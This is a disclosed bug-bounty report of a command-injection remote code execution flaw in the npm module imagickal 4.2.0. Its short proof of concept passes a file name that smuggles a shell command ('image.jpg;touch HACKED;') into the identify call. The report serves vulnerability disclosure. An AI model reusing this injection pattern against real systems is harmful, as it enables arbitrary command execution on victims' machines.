# [C] [imagickal] Remote Code Execution

## Summary
Severity: Critical
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: solov9ev
State: resolved
Disclosed: 2021-01-14T08:39:54.544Z
Source: https://hackerone.com/reports/973245

## Details
I would like to report `RCE` in `imagickal`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** imagickal
**version:** 4.2.0
**npm page:** `https://www.npmjs.com/package/imagickal`

## Module Description

node wrapper for ImageMagick commands

## Module Stats

[42] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection while processing a photo

## Steps To Reproduce:

- Run `npm i imagickal`
- Create and run the following POC index.js:

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

- The exploit worked and created the file - `HACKED`


_Trimmed to 38 lines — full report: https://hackerone.com/reports/973245_
